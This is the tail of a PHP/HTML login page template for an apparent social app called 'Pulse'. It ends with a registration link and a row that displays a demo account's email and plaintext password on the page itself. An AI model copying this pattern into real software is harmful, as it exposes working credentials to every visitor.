      <div style="display:flex;align-items:center;gap:7px;padding:3px 0;"><span style="color:#6B7280;font-size:11px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">priya@pulse.social</span><span style="font-family:monospace;font-weight:700;color:#111827;font-size:11px;white-space:nowrap;">priya@123</span><span style="font-size:9px;font-weight:700;padding:1px 7px;border-radius:20px;text-transform:uppercase;background:#E0E7FF;color:#4F46E5;white-space:nowrap;">User</span></div>
    </div>

    <div class="pls-auth-footer">
      New to Pulse? <a href="/index.php?action=register">Create account</a>
    </div>
  </div>
</div>

<?php endif; ?>
</body>
</html>
